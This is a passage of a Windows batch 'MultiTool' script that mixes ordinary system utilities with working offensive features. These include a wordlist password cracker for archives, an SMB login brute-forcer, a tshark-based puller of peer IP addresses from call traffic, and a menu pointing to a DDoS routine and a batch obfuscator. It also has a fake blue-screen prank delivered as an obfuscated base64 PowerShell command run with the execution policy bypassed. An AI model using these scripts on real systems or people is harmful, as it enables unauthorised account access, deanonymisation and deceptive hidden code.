  echo Output saved to %OUTPUT%
)
pause
goto page-2

:Diagnostic
cls
setlocal
set BASEDIR=%~dp0output\diag_output
for /f "tokens=1-3 delims=/ " %%a in ('date /t') do set D=%%c-%%a-%%b
for /f "tokens=1-2 delims=: " %%t in ('time /t') do set T=%%t%%t
set TIMESTAMP=%D%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%
set OUTDIR=%BASEDIR%\%TIMESTAMP%
mkdir "%OUTDIR%" 2>nul

echo Collecting diagnostics to %OUTDIR%

echo --- ipconfig --- > "%OUTDIR%\ipconfig.txt"
ipconfig /all >> "%OUTDIR%\ipconfig.txt" 2>&1

echo --- netstat --- > "%OUTDIR%\netstat.txt"
netstat -ano >> "%OUTDIR%\netstat.txt" 2>&1

echo --- route --- > "%OUTDIR%\route.txt"
route print >> "%OUTDIR%\route.txt" 2>&1

echo --- systeminfo --- > "%OUTDIR%\systeminfo.txt"
systeminfo >> "%OUTDIR%\systeminfo.txt" 2>&1

echo --- tasklist --- > "%OUTDIR%\tasklist.txt"
tasklist /V >> "%OUTDIR%\tasklist.txt" 2>&1

echo --- services --- > "%OUTDIR%\services.txt"
sc query state= all >> "%OUTDIR%\services.txt" 2>&1

echo --- event logs (last 500 system events) --- > "%OUTDIR%\system_events.txt"
wevtutil qe System /f:text /c:500 >> "%OUTDIR%\system_events.txt" 2>&1

echo --- installed programs (partial) --- > "%OUTDIR%\installed_programs.txt"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s /v DisplayName > "%OUTDIR%\installed_programs.txt" 2>&1

echo --- collecting wireless profiles (if available) --- > "%OUTDIR%\wifi_profiles.txt"
netsh wlan show profiles >> "%OUTDIR%\wifi_profiles.txt" 2>&1

echo Done collecting files.

endlocal
pause
goto page-2

:Computer_Power
cls
echo 1) Lock
echo 2) Sleep
echo 3) Shutdown
echo 4) Stop Computer
echo 5) Restart
echo 6) Hibernate
echo 7) Advance Startup Menu
echo 8) BIOS Menu
echo 9) Back to Menu
echo.
echo.
echo 10) Emergency Restart
echo 	a. Press Ctrl + Alt + Delete.
echo 	b. Press and hold the Ctrl key again.
echo 	c. Click the Power icon in the bottom right corner while still holding Ctrl.
echo 	d. Click OK on the emergency restart prompt to force an immediate reboot
set /p input=">>"
if %input% EQU 1 goto Lock-Power
if %input% EQU 2 goto Sleep-Power
if %input% EQU 3 goto Shutdown-Power
if %input% EQU 4 goto Stop-Power
if %input% EQU 5 goto Restart-Power
if %input% EQU 6 goto Hibernate
if %input% EQU 7 goto advance-restart
if %input% EQU 8 goto BIOS-menu
if %input% EQU 9 goto page-2
cls
goto Computer_Power

:Lock-Power
cls
rundll32.exe user32.dll,LockWorkStation
goto Computer_Power

:Sleep-Power
cls
rundll32.exe powrprof.dll,SetSuspendState 0,1,0
goto Computer_Power

:Shutdown-Power
cls
shutdown /s /f /t 0
goto Computer_Power

:Stop-Power
cls
powershell Stop-Computer
goto Computer_Power

:Restart-Power
cls
shutdown /r /t 0
goto Computer_Power

:Hibernate
cls
shutdown /h /t 0
goto Computer_Power

:advance-restart
cls
shutdown /r /o /f /t 00
exit


:BIOS-menu
cls
net session >nul 2>&1
if %errorLevel% == 0 (
    shutdown /r /fw /t 1
) else (
    powershell -Command "Start-Process cmd -ArgumentList '/c shutdown /r /fw /t 1' -Verb RunAs -WindowStyle Hidden"
)
goto Computer_Power

:remote_destop
cls
set /p host="host>> "
set /p user="username>> "
set /p pass="password>> "
cmdkey /add:%host% /user:%user% /pass:%pass% >nul
mstsc /v:%host%
cmdkey /delete:%host% >nul
pause
goto page-2

:WinRAR_Cracker
cls
color 3
if not exist "C:\Program Files\7-Zip" (
	echo 7-Zip not installed!
	pause
	goto page-2
)

echo.
set /p archive="Enter Archive: "
if not exist "%archive%" (
	echo Archive not found!
	pause
	goto page-2
)

set /p wordlist="Enter Wordlist: "
if not exist "%wordlist%" (
	echo Wordlist not found!
	pause
	goto page-2
)
echo Cracking...
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attempt
)
echo shitty wordlist dumbass
pause
goto page-2

:attempt
"C:\Program Files\7-Zip\7z.exe" x -p%pass% "%archive%" -o"cracked" -y >nul 2>&1
echo ATTEMPT : %pass%
if /I %errorlevel% EQU 0 (
	echo Success! Password Found: %pass%
	pause
	goto page-2
)

:Registry
cls
echo Registry Backup / Restore
echo 1) Export a registry key to .reg (safe, can be imported later)
echo 2) Import a .reg file (CAUTION)
echo 3) Save hive (reg save) - requires admin
echo 4) Restore hive (reg load/import) - dangerous; requires admin
echo 5) Back
set /p CHOICE="Choice [1-5]: "

if "%CHOICE%"=="1" goto export-reg
if "%CHOICE%"=="2" goto import-reg
if "%CHOICE%"=="3" goto savehive
if "%CHOICE%"=="4" goto restorehive
if "%CHOICE%"=="5" goto page-2
echo Invalid choice
pause
goto page-2

:export-reg
set /p KEY="Registry key to export (e.g. HKLM\SOFTWARE\MyApp): "
if "%KEY%"=="" goto registry
set /p OUT="Output file (full path, default: %~dp0reg_export.reg): "
if "%OUT%"=="" set OUT=%~dp0reg_export.reg
echo Exporting %KEY% to %OUT%
reg export "%KEY%" "%OUT%" /y
echo Done.
pause
goto page-2

:import-reg
echo WARNING: importing a .reg file can modify or damage the registry.
set /p CONF="Are you sure you want to import a .reg file? (type YES to continue): "
if not "%CONF%"=="YES" (
  echo Aborted.
  pause
  goto page-2
)
set /p INFILE="Path to .reg file: "
if not exist "%INFILE%" (
  echo File not found.
  pause
  goto page-2
)
echo Importing %INFILE%
reg import "%INFILE%"
echo Done.
pause
goto page-2

:savehive
echo reg save saves an offline copy of a registry hive and usually requires admin.
set /p HIVE="Hive to save (e.g. HKLM\SOFTWARE): "
if "%HIVE%"=="" goto registry
set /p OUTFILE="Output hive file path (e.g. C:\backups\software.hiv): "
if "%OUTFILE%"=="" goto registry
echo Saving hive %HIVE% to %OUTFILE%
reg save "%HIVE%" "%OUTFILE%" /y
echo Done.
pause
goto page-2

:restorehive
echo Restoring/loading registry hives is potentially dangerous.
set /p CONF2="Type RESTORE to continue: "
if not "%CONF2%"=="RESTORE" (
  echo Aborted.
  pause
  goto page-2
)
echo For restore, typically you use reg restore or reg load depending on scenario.
echo Example: reg restore HKLM\SOFTWARE path\to\software.hiv
echo Please run the specific reg restore/load command manually with admin privileges.
pause
goto page-2

:SMB_Brute
cls
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

:: Verify the wordlist file exists
if not exist "%wordlist%" (
    echo Error: Wordlist file not found!
    pause
    goto page-2
)

set /a count=1

:: usebackq allows quoted file paths. delims= prevents splitting passwords with spaces.
for /f "usebackq delims=" %%a in ("%wordlist%") do (
    set "pass=%%a"
    call :attempt-smb
)

echo Password not Found :(
pause
goto page-2

:success-smb
echo.
echo Password Found! %pass%
:: Disconnect the successful session to clean up
net use \\%ip% /d /y >nul 2>&1
pause
goto page-2

:attempt-smb
:: CRITICAL: Clear any cached connections to prevent false positives
net use \\%ip% /d /y >nul 2>&1

:: Attempt connection (Quotes added to handle spaces in user/pass)
net use \\%ip% /user:"%user%" "%pass%" >nul 2>&1

echo [ATTEMPT %count%] [%pass%]
set /a count+=1

if %errorlevel% EQU 0 goto success-smb

:: Return to the for loop
exit /

:Custom_CMD
cls
title pro hacker console
chcp 65001 >nul
echo.
echo.
echo.
echo [34m                               ┌─┐┌─┐┌┬┐┌┬┐┌─┐┌┐┌┌┬┐  ┌─┐┬─┐┌─┐┌┬┐┌─┐┌┬┐[0m
echo [94m                               │  │ │││││││├─┤│││ ││  ├─┘├┬┘│ ││││├─┘ │ [0m
echo [96m                               └─┘└─┘┴ ┴┴ ┴┴ ┴┘└┘─┴┘  ┴  ┴└─└─┘┴ ┴┴   ┴ [0m
echo.
echo                                Type "goto page-2" to return to main menu
echo.
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
:input-cus
echo.
echo  [97m╔══[0m([92m%username%[0m@[95m%computername%[0m)-[[91m%cd%[0m]
set /p cmd=".%BS% [97m╚══>[0m "
if /I %input% EQU menu goto page-2
echo.
%cmd%
goto input-cus

:IP-call-puller
cls
color A
setlocal

rem save public ip as variable
for /f "usebackq delims=" %%i in (`powershell -NoProfile -Command "(Invoke-RestMethod -Uri https://api.ipify.org)"`) do (
    set "publicip=%%i"
)

if not defined publicip (
    echo Failed to retrieve public IP.
    pause
    goto page-2
)

set "tshark="

if exist "C:\Program Files\Wireshark\tshark.exe" (
    set "tshark=C:\Program Files\Wireshark\tshark.exe"
) else if exist "C:\Program Files (x86)\Wireshark\tshark.exe" (
    set "tshark=C:\Program Files (x86)\Wireshark\tshark.exe"
)

if not defined tshark (
    echo Wireshark not found.
    start https://www.wireshark.org/download.html
    pause
    goto page-2
)

echo tshark.exe Found! (%tshark%)
echo.
"%tshark%" -D
echo.

set /p "interface=Interface #: "

cls
echo.
echo IP Dump
echo -------
echo.

"%tshark%" -i "%interface%" -f "udp" -Y "stun.type == 0x0101 && stun.att.type == 0x0020 && stun.att.ipv4 != %publicip%" -T fields -e stun.att.ipv4

:ankush
cls
set /p eq= apna calculater:
set /a ans=%eq%
echo = %ans%
pause
cls
goto page-2

:backup-files
cls
cd C:\
set /p SourcePath="Enter Source Path: "
set /p DestinationPath="Enter Destination Path: "

if "%SourcePath%"=="" (
    echo No source path entered. Exiting.
    pause
    goto page-2
)

if "%DestinationPath%"=="" (
    echo No destination path entered. Exiting.
    pause
    goto page-2
)

echo Backing up files...
xcopy "%SourcePath%" "%DestinationPath%" /e /i /h /y
echo Backup completed.
pause
goto page-2

:large-files
cls
cd C:\
:: Lists the 20 largest files in a folder (and subfolders) you specify
setlocal enabledelayedexpansion
set /p TARGET="Enter folder path to scan (e.g. C:\Users\%USERNAME%\Downloads): "
echo.
echo Scanning %TARGET% for largest files...
echo (this may take a moment for big folders)
echo.
powershell -Command "Get-ChildItem -Path '%TARGET%' -Recurse -File -ErrorAction SilentlyContinue | Sort-Object Length -Descending | Select-Object -First 20 FullName, @{Name='SizeMB';Expression={[math]::Round($_.Length/1MB,2)}} | Format-Table -AutoSize"
pause
goto page-2

:disk-space
cls
echo Checking disk space...
echo.
wmic logicaldisk get caption,description,freespace,size
echo.
echo (Values shown in bytes)
pause
goto page-2

:youtube-video
cls
setlocal enabledelayedexpansion

set "FAVDIR=%~dp0output\youtube"
set "FAVFILE=%FAVDIR%\favorites.txt"
if not exist "%FAVDIR%" mkdir "%FAVDIR%"
if not exist "%FAVFILE%" type nul > "%FAVFILE%"

:youtube-main
cls
echo ============================
echo   YouTube Minimal Player
echo ============================
echo.
echo What are you entering?
echo   1. YouTube Video URL
echo   2. YouTube Video ID
echo   3. Search Term
echo   4. Play from Favorites
echo   5. Back to Menu
echo.
set /p CHOICE="Enter 1, 2, 3, 4, or 5: "

if "%CHOICE%"=="1" (
    set /p INPUT="Paste the full YouTube video URL: "
    set "URL=!INPUT!"
    goto play
) else if "%CHOICE%"=="2" (
    set /p INPUT="Enter the YouTube video ID: "
    set "URL=https://www.youtube.com/watch?v=!INPUT!"
    goto play
) else if "%CHOICE%"=="3" (
    set /p INPUT="Enter your search term: "
    set "URL=https://www.youtube.com/results?search_query=!INPUT!"
    goto play
) else if "%CHOICE%"=="4" (
    goto favorites
) else if "%CHOICE%"=="5" (
	goto page-2
) else (
    echo Invalid choice, please try again.
    timeout /t 2 >nul
    goto youtube-main
)

:favorites
cls
echo ============================
echo   Your Favorite Videos
echo ============================
echo.
set COUNT=0
for /f "usebackq tokens=1,* delims=|" %%A in ("%FAVFILE%") do (
    set /a COUNT+=1
    set "FAVNAME[!COUNT!]=%%A"
    set "FAVURL[!COUNT!]=%%B"
    echo   !COUNT!. %%A
)
if %COUNT%==0 (
    echo No favorites saved yet.
    pause
    goto youtube-main
)
echo.
echo   0. Back to main menu
echo.
set /p FAVCHOICE="Pick a favorite to play (number): "
if "%FAVCHOICE%"=="0" goto youtube-main
set "URL=!FAVURL[%FAVCHOICE%]!"
if "!URL!"=="" (
    echo Invalid selection.
    timeout /t 2 >nul
    goto favorites
)
set "CHOICE=4"
goto play

:play
:: Try Chrome first, then Edge, then fall back to default browser
set "CHROME=%ProgramFiles%\Google\Chrome\Application\chrome.exe"
set "CHROME86=%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
set "EDGE=%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe"

if exist "%CHROME%" (
    start "" "%CHROME%" --app=!URL! --window-size=900,600 --window-position=200,100
) else if exist "%CHROME86%" (
    start "" "%CHROME86%" --app=!URL! --window-size=900,600 --window-position=200,100
) else if exist "%EDGE%" (
    start "" "%EDGE%" --app=!URL! --window-size=900,600 --window-position=200,100
) else (
    echo Chrome/Edge not found in default locations - opening in your default browser instead.
    start "!URL!"
)

:: Offer to save as a favorite (skip for search terms and already-saved favorites)
if "%CHOICE%"=="3" goto skipsave
if "%CHOICE%"=="4" goto skipsave
echo.
choice /c YN /m "Save this video as a favorite?"
if errorlevel 2 goto skipsave
if errorlevel 1 (
    set /p FAVNAME_NEW="Enter a nickname for this favorite: "
    echo !FAVNAME_NEW!^|!URL!>> "%FAVFILE%"
    echo Saved!
)

:skipsave
pause
goto youtube-another

:youtube-another
cls
echo ============================
echo   Play another video?
echo ============================
echo.
choice /c YN /m "Press Y to play another, or N to exit"
if errorlevel 2 goto end
if errorlevel 1 goto youtube-main

:end
echo Goodbye!
timeout /t 2 >nul
goto page-2

:software-removal
cls
mrt
goto page-2

:Colors
cls
echo [101;93m STYLES [0m
echo ^<ESC^>[0m [0mReset[0m
echo ^<ESC^>[1m [1mBold[0m
echo ^<ESC^>[4m [4mUnderline[0m
echo ^<ESC^>[7m [7mInverse[0m
echo.
echo [101;93m NORMAL FOREGROUND COLORS [0m
echo ^<ESC^>[30m [30mBlack[0m (black)
echo ^<ESC^>[31m [31mRed[0m
echo ^<ESC^>[32m [32mGreen[0m
echo ^<ESC^>[33m [33mYellow[0m
echo ^<ESC^>[34m [34mBlue[0m
echo ^<ESC^>[35m [35mMagenta[0m
echo ^<ESC^>[36m [36mCyan[0m
echo ^<ESC^>[37m [37mWhite[0m
echo.
echo [101;93m NORMAL BACKGROUND COLORS [0m
echo ^<ESC^>[40m [40mBlack[0m
echo ^<ESC^>[41m [41mRed[0m
echo ^<ESC^>[42m [42mGreen[0m
echo ^<ESC^>[43m [43mYellow[0m
echo ^<ESC^>[44m [44mBlue[0m
echo ^<ESC^>[45m [45mMagenta[0m
echo ^<ESC^>[46m [46mCyan[0m
echo ^<ESC^>[47m [47mWhite[0m (white)
echo.
echo [101;93m STRONG FOREGROUND COLORS [0m
echo ^<ESC^>[90m [90mWhite[0m
echo ^<ESC^>[91m [91mRed[0m
echo ^<ESC^>[92m [92mGreen[0m
echo ^<ESC^>[93m [93mYellow[0m
echo ^<ESC^>[94m [94mBlue[0m
echo ^<ESC^>[95m [95mMagenta[0m
echo ^<ESC^>[96m [96mCyan[0m
echo ^<ESC^>[97m [97mWhite[0m
echo.
echo [101;93m STRONG BACKGROUND COLORS [0m
echo ^<ESC^>[100m [100mBlack[0m
echo ^<ESC^>[101m [101mRed[0m
echo ^<ESC^>[102m [102mGreen[0m
echo ^<ESC^>[103m [103mYellow[0m
echo ^<ESC^>[104m [104mBlue[0m
echo ^<ESC^>[105m [105mMagenta[0m
echo ^<ESC^>[106m [106mCyan[0m
echo ^<ESC^>[107m [107mWhite[0m
echo.
echo [101;93m COMBINATIONS [0m
echo ^<ESC^>[31m                     [31mred foreground color[0m
echo ^<ESC^>[7m                      [7minverse foreground ^<-^> background[0m
echo ^<ESC^>[7;31m                   [7;31minverse red foreground color[0m
echo ^<ESC^>[7m and nested ^<ESC^>[31m [7mbefore [31mnested[0m
echo ^<ESC^>[31m and nested ^<ESC^>[7m [31mbefore [7mnested[0m
pause
goto start

:page-3
cls
title MultiTool - by DrollerBike
call :banner

:menu3
echo.
echo.
echo [38;2;255;255;0m        ╔═(33) Full Network Report                                                                   Sudo (41)═╗[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠══(34) Screen Steps Recorder                                                  System Properties (42)══╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠═══(35) Fake Blue Screen                                                   Create Share Folder (43)═══╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠════(36) Fake Update Screen                                        Backup and Restore Windows (44)════╣[0m 
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠═════(37) Batch File Obfuscator                                        Presentation Settings (45)═════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m
echo [38;2;255;255;0m        ╠══════(38) Notepad in CMD                                                  Resource Monitor (46)══════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠═══════(39) Windows System Info                                              User Accounts (47)═══════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╠════════(40) Windows Remote Assistance                                           NsLookup (48)════════╣[0m  
echo [38;2;255;255;0m        ║                                                                                                      ║[0m  
echo [38;2;255;255;0m        ╚╦════════(P2) Page 2                                                              Page 4 (P4)════════╦╝[0m  
echo [38;2;255;255;0m         ╚══════════════════════════════════════════════════╦═════════════════════════════════════════════════╝[0m  
set /p input=.%BS% [38;2;255;255;0m                                                           ╚══════^>[0m  
if /I %input% EQU 1 start kill_cmd.lnk
if /I %input% EQU 2 start kill_powershell.lnk
if /I %input% EQU 3 goto net_shut
if /I %input% EQU 4 goto kill_windows
if /I %input% EQU 5 goto show_networks
if /I %input% EQU 6 goto weather
if /I %input% EQU 7 goto geolocate
if /I %input% EQU 8 goto DDosAttack
if /I %input% EQU 0 exit
if /I %input% EQU 9 goto network_info
if /I %input% EQU 10 goto Telehack
if /I %input% EQU 11 goto Dictonary
if /I %input% EQU 12 goto Gui_Test
if /I %input% EQU 13 goto Qrcode_Maker
if /I %input% EQU 14 goto Shorten_Links
if /I %input% EQU 15 goto Delete_temp
if /I %input% EQU 16 goto about-dbgmultitool
if /I %input% EQU 17 goto System_info
if /I %input% EQU 18 goto Diagnostic
if /I %input% EQU 19 goto Computer_Power
if /I %input% EQU 20 goto remote_destop
if /I %input% EQU 21 goto WinRAR_Cracker
if /I %input% EQU 22 goto Registry
if /I %input% EQU 23 goto SMB_Brute
if /I %input% EQU 24 goto Custom_CMD
if /I %input% EQU 25 goto IP-call-puller
if /I %input% EQU 26 goto ankush
if /I %input% EQU 27 goto backup-files
if /I %input% EQU 28 goto large-files
if /I %input% EQU 29 goto disk-space
if /I %input% EQU 30 goto youtube-video
if /I %input% EQU 31 goto software-removal
if /I %input% EQU 32 goto Colors
if /I %input% EQU 33 goto network__report
if /I %input% EQU 34 goto screen-steps-recorder
if /I %input% EQU 35 goto Fake-Blue-Screen
if /I %input% EQU 36 goto Fake-Update-Screen
if /I %input% EQU 37 goto obfuscator
if /I %input% EQU 38 goto notepad-CMD
if /I %input% EQU 39 goto windows-system-Info
if /I %input% EQU 40 goto remote-assistance
if /I %input% EQU 41 goto sudo
if /I %input% EQU 42 goto system-properties
if /I %input% EQU 43 goto create-share-folder
if /I %input% EQU 44 goto sdclt
if /I %input% EQU 45 goto presentation-settings
if /I %input% EQU 46 goto resource-monitor
if /I %input% EQU 47 goto user-account
if /I %input% EQU 48 goto nslookup
if /I %input% EQU P1 goto start
if /I %input% EQU p1 goto start
if /I %input% EQU P2 goto page-2
if /I %input% EQU p2 goto page-2
if /I %input% EQU restart goto start
if /I %input% EQU Restart goto start
if /I %input% EQU RESTART goto start
if /I %input% EQU crash-me goto crasher
if /I %input% EQU advance-restart goto advance-restart
if /I %input% EQU Advance-Restart goto advance-restart
if /I %input% EQU AR goto advance-restart
if /I %input% EQU ar goto advance-restart
if /I %input% EQU kitty goto kitty-curl
if /I %input% EQU rick goto rick-curl
if /I %input% EQU run-man goto runman-curl
if /I %input% EQU star-wars goto starwars-curl
if /I %input% EQU Clock goto Clock
if /I %input% EQU clock goto Clock
if /I %input% EQU KYS exit
if /I %input% EQU kys exit
if /I %input% EQU echo-Hello-World! goto Hello-World!
if /I %input% EQU print("Hello-World!") goto Hello-World!
if /I %input% EQU Hello-World goto Hello-World!
if /I %input% EQU BIOS goto BIOS-menu
if /I %input% EQU Basic-Input/Output-System goto BIOS-menu
if /I %input% EQU fuck-you goto fuck-you
if /I %input% EQU fuck goto fuck-you
if /I %input% EQU blue-screen goto Blue-Screen
cls
goto page-2

:network__report
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :isAdmin-netreport
) else (
    goto :escalate-netreport
)

:escalate-netreport
:: Create a temporary VBScript to elevate the batch file, passing the target label as an argument
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "%~s0", "isAdmin-netreport", "", "runas", 1 >> "%temp%\getadmin.vbs"
"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
exit /b

:isAdmin-netreport
if exist "C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html" (
    del "C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html" >nul 2>&1
)
cls
netsh wlan show wlanreport
echo.
echo Press enter to open the report in the broswer you choose browser.
echo.
pause
OpenWith.exe "C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html"
pause

:network_report_choice
cls
echo.
echo.
echo If you want to save the report, move it from C:\ProgramData\Microsoft\Windows\WlanReport\wlan-report-latest.html to another location.
echo.
echo.
echo 1) Save report to another location
echo.
echo 2) Run another network report
echo.
echo 3) Back to menu
echo. 
set "CHOICE="
set /p CHOICE="Enter 1, 2, or 3: "

if "%CHOICE%"=="1" (
    cls
    setlocal EnableDelayedExpansion

    set /p "dest=Enter the full path of the destination folder: "
    set "dest=%dest:"=%"

    if "!dest:~-1!"=="\" set "dest=!dest:~0,-1!"

    if "!dest!"=="" (
        echo No path entered.
        pause
        endlocal
        goto network_report_choice
    )

    if not exist "!dest!" (
        echo Folder does not exist. Creating: "!dest!"
        mkdir "!dest!"
        if errorlevel 1 (
            echo Failed to create folder.
            pause
            endlocal
            goto network_report_choice
        )
    )

    robocopy "C:\ProgramData\Microsoft\Windows\WlanReport" "!dest!" "wlan-report-latest.html" /move

    if !errorlevel! geq 8 (
        echo Robocopy encountered an error. Exit code: !errorlevel!
    ) else (
        echo Copy completed successfully. Exit code: !errorlevel!
    )

    pause
    endlocal
    goto network_report_choice
) else if "%CHOICE%"=="2" (
    cls
    goto network__report
) else if "%CHOICE%"=="3" (
    goto page-3
) else (
    cls
    echo Invalid choice, please try again.
    timeout /t 2 >nul
    goto network_report_choice
)

:screen-steps-recorder
cls
echo.
echo Click Settings to configure output file options, then click Start Record to begin capturing your screen steps.
echo.
psr
pause
goto page-3

:Fake-Blue-Screen
cls
powershell -ExecutionPolicy Bypass -EncodedCommand JABUAGUAeAB0ACAAPQAgACIAQQAgAHAAcgBvAGIAbABlAG0AIABoAGEAcwAgAGIAZQBlAG4AIABkAGUAdABlAGMAdABlAGQAIABhAG4AZAAgAFcAaQBuAGQAbwB3AHMAIABoAGEAcwAgAGIAZQBlAG4AIABzAGgAdQB0ACAAZABvAHcAbgAgAHQAbwAgAHAAcgBlAHYAZQBuAHQAIABkAGEAbQBhAGcAZQAgAGAAbgB0AG8AIAB5AG8AdQByACAAYwBvAG0AcAB1AHQAZQByAC4AYABuAGAAbgBDAFIASQBUAEkAQwBBAEwAXwBTAEUAUgBWAEkAQwBFAF8ARgBBAEkATABFAEQAYABuAGAAbgBJAGYAIAB0AGgAaQBzACAAaQBzACAAdABoAGUAIABmAGkAcgBzAHQAIAB0AGkAbQBlACAAeQBvAHUAJwB2AGUAIABzAGUAZQBuACAAdABoAGkAcwAgAFMAdABvAHAAIABlAHIAcgBvAHIAIABzAGMAcgBlAGUAbgAsACAAYABuAHIAZQBzAHQAYQByAHQAIAB5AG8AdQByACAAYwBvAG0AcAB1AHQAZQByAC4AIABJAGYAIAB0AGgAaQBzACAAcwBjAHIAZQBlAG4AIABhAHAAcABlAGEAcgBzACAAYQBnAGEAaQBuACwAIABmAG8AbABsAG8AdwBgAG4AdABoAGUAcwBlACAAcwB0AGUAcABzADoAYABuAGAAbgBDAGgAZQBjAGsAIAB0AG8AIABtAGEAawBlACAAcwB1AHIAZQAgAGEAbgB5ACAAbgBlAHcAIABoAGEAcgBkAHcAYQByAGUAIABvAHIAIABzAG8AZgB0AHcAYQByAGUAIABpAHMAIABwAHIAbwBwAGUAcgBsAHkAIABpAG4AcwB0AGEAbABsAGUAZAAuAGAAbgBJAGYAIAB0AGgAaQBzACAAaQBzACAAYQAgAG4AZQB3ACAAaQBuAHMAdABhAGwAbABhAHQAaQBvAG4ALAAgAGEAcwBrACAAeQBvAHUAcgAgAGgAYQByAGQAdwBhAHIAZQAgAG8AcgAgAHMAbwBmAHQAdwBhAHIAZQAgAG0AYQBuAHUAZgBhAGMAdAB1AHIAZQByAGAAbgBmAG8AcgAgAGEAbgB5ACAAVwBpAG4AZABvAHcAcwAgAHUAcABkAGEAdABlAHMAIAB5AG8AdQAgAG0AaQBnAGgAdAAgAG4AZQBlAGQALgBgAG4AYABuAEkAZgAgAHAAcgBvAGIAbABlAG0AcwAgAGMAbwBuAHQAaQBuAHUAZQAsACAAZABpAHMAYQBiAGwAZQAgAG8AcgAgAHIAZQBtAG8AdgBlACAAYQBuAHkAIABuAGUAdwBsAHkAIABpAG4AcwB0AGEAbABsAGUAZAAgAGgAYQByAGQAdwBhAHIAZQAgAGAAbgBvAHIAIABzAG8AZgB0AHcAYQByAGUALgAgAEQAaQBzAGEAYgBsAGUAIABCAEkATwBTACAAbQBlAG0AbwByAHkAIABvAHAAdABpAG8AbgBzACAAcwB1AGMAaAAgAGEAcwAgAGMAYQBjAGgAaQBuAGcAIABvAHIAIABzAGgAYQBkAG8AdwBpAG4AZwAuAGAAbgBJAGYAIAB5AG8AdQAgAG4AZQBlAGQAIAB0AG8AIAB1AHMAZQAgAFMAYQBmAGUAIABNAG8AZABlACAAdABvACAAcgBlAG0AbwB2AGUAIABvAHIAIABkAGkAcwBhAGIAbABlACAAYwBvAG0AcABvAG4AZQBuAHQAcwAsACAAcgBlAHMAdABhAHIAdABgAG4AeQBvAHUAcgAgAGMAbwBtAHAAdQB0AGUAcgAsACAAcAByAGUAcwBzACAARgA4ACAAdABvACAAcwBlAGwAZQBjAHQAIABBAGQAdgBhAG4AYwBlAGQAIABTAHQAYQByAHQAdQBwACAATwBwAHQAaQBvAG4AcwAsACAAYQBuAGQAIAB0AGgAZQBuAGAAbgBzAGUAbABlAGMAdAAgAFMAYQBmAGUAIABNAG8AZABlAC4AYABuAGAAbgBUAGUAYwBoAG4AaQBjAGEAbAAgAEkAbgBmAG8AcgBtAGEAdABpAG8AbgA6AGAAbgBgAG4AKgAqACoAIABTAFQATwBQADoAIAAwAHgAMAAwADAAMAAwADAANQBBACAAKAAwAHgAMAAwADAAMAAwADAAMAAxACwAIAAwAHgAMAAwADAAMAAwADAAMAAxACwAIAAwAHgAMAAwADAAMAAwADAAMAAwACwAIAAwAHgAMAAwADAAMAAwADAAMAAwACkAYABuAGAAbgBQAHIAZQBzAHMAIABSACAAdABvACAAUgBlAHMAdABhAHIAdAAgAEMAbwBtAHAAdQB0AGUAcgBgAG4AYABuAEMAbwBsAGwAZQBjAHQAaQBuAGcAIABkAGEAdABhACAAZgBvAHIAIABjAHIAYQBzAGgAIABkAHUAbQBwACAALgAuAC4AYABuAEkAbgBpAHQAaQBhAGwAaQB6AGkAbgBnACAAZABpAHMAawAgAGYAbwByACAAYwByAGEAcwBoACAAZAB1AG0AcAAgAC4ALgAuAGAAbgBCAGUAZwBpAG4AbgBpAG4AZwAgAGQAdQBtAHAAIABmAG8AcgAgAHAAaAB5AHMAaQBjAGEAbAAgAG0AZQBtAG8AcgB5AC4AYABuAEQAdQBtAHAAaQBuAGcAIABwAGgAeQBzAGkAYwBhAGwAIABtAGUAbQBvAHIAeQAgAHQAbwAgAGQAaQBzAGsAOgAgADEAMAAwAGAAbgBQAGgAeQBzAGkAYwBhAGwAIABtAGUAbQBvAHIAeQAgAGQAdQBtAHAAIABjAG8AbQBwAGwAZQB0AGUALgBgAG4AQwBvAG4AdABhAGMAdAAgAHkAbwB1AHIAIABzAHkAcwB0AGUAbQAgAGEAZABtAGkAbgAgAG8AcgAgAHQAZQBjAGgAbgBpAGMAYQBsACAAcwB1AHAAcABvAHIAdAAgAGcAcgBvAHUAcAAgAGYAbwByACAAZgB1AHIAdABoAGUAcgAgAGEAcwBzAGkAcwB0AGEAbgBjAGUALgAiADsAIABBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAbQBiAGwAeQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsAIAAkAEwAYQBiAGUAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzAC4ATABhAGIAZQBsADsAIAAkAEwAYQBiAGUAbAAuAFQAYQBiAEkAbgBkAGUAeAAgAD0AIAAxADsAIAAkAEwAYQBiAGUAbAAuAFQAZQB4AHQAIAA9ACAAJABUAGUAeAB0ADsAIAAkAEwAYQBiAGUAbAAuAEYAbwByAGUAQwBvAGwAbwByACAAPQAgACcAVwBoAGkAdABlACcAOwAgACQATABhAGIAZQBsAC4AQQB1AHQAbwBTAGkAegBlACAAPQAgACQAVAByAHU